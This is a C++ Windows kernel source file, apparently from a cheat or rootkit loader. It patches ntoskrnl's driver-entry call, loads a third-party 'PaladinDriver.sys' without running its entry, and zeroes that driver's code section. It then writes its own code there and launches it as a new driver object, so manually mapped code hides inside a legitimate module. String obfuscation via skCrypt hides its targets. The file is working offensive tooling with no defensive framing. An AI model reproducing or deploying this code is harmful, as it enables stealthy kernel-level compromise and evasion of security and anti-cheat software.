#include <ntifs.h>
#include <windef.h>
#include <cstdint>
#include <intrin.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntstrsafe.h>

#include <kernel/defs.h>
#include <kernel/structures.hpp>
#include <kernel/xor.hpp>

#include <impl/communication/structs.h>

#include <impl/imports.h>
#include <impl/scanner.h>
#include <impl/modules.h>
#include <impl/drivers.h>

#define PATCH_LENTH 5

modules::section_data text_section = modules::section_data();

#pragma runtime_checks("", off)
#pragma optimize("", off)

NTSTATUS new_driver_entry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING registry_path, PVOID param)
{


	return (NTSTATUS)param;
}

#pragma runtime_checks("", restore)
#pragma optimize("", on)

NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
{
	const auto ntoskrnl_base = modules::get_kernel_module(skCrypt("ntoskrnl.exe"));
	if (!ntoskrnl_base)
	{
		printf("Couldnt find ntoskrnl.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Ntoskrnl base: 0x%llx\n", ntoskrnl_base);

	const auto calldrv_address = scanner::find_pattern(ntoskrnl_base, "\xE8\x00\x00\x00\x00\x44\x8B\xF0\x85\xC0\x78\x15", "x????xxxxxxx");
	if (!calldrv_address)
	{
		printf("Invalid pattern.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("PnpCallDriverEntry address: 0x%llx\n", calldrv_address);

	const auto original_bytes = reinterpret_cast<uint8_t*>(imports::ex_allocate_pool(NonPagedPool, PATCH_LENTH));
	if (!original_bytes)
	{
		printf("Failed to allocate buffer.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Original bytes buffer: 0x%llx\n", (reinterpret_cast<uintptr_t>(original_bytes)));

	// Patch IopLoadDriver to not call driver entry
	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);

	// Load driver to exploit
	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv1")))
	{
		printf("Couldnt load driver.\n");
		ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
		imports::ex_free_pool_with_tag(original_bytes, 0);
		return STATUS_UNSUCCESSFUL;
	}
	printf("Loaded vurnable driver.\n");
	
	// Restore bytes
	ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
	imports::ex_free_pool_with_tag(original_bytes, 0);

	printf("Restored original bytes.\n");

	const auto vurn_driver_base = modules::get_kernel_module(skCrypt("PaladinDriver.sys"));
	if (!vurn_driver_base) 
	{
		printf("Couldnt find vurnable driver.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Vurnable driver base: 0x%llx\n", vurn_driver_base);

	text_section = modules::find_section(vurn_driver_base, skCrypt(".text"));
	if (!text_section) 
	{
		printf("Text section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Text section size: 0x%llx\n", text_section.size);
	printf("Text section base: 0x%llx\n", text_section.address);

	// Zero .text section
	ctx::zero_address_range(text_section.address, text_section.size);

	const auto shellcode_size = ctx::get_function_size(new_driver_entry);
	printf("Shellcode size: 0x%llx\n", shellcode_size);

	// Write new driver entry
	ctx::write_protected_address(reinterpret_cast<void*>(text_section.address), new_driver_entry, shellcode_size, true);

	// Create new driver and call entry
	return drivers::create_driver(0, reinterpret_cast<PEXDRIVER_INITIALIZE>(text_section.address), (PVOID)0x1337);
}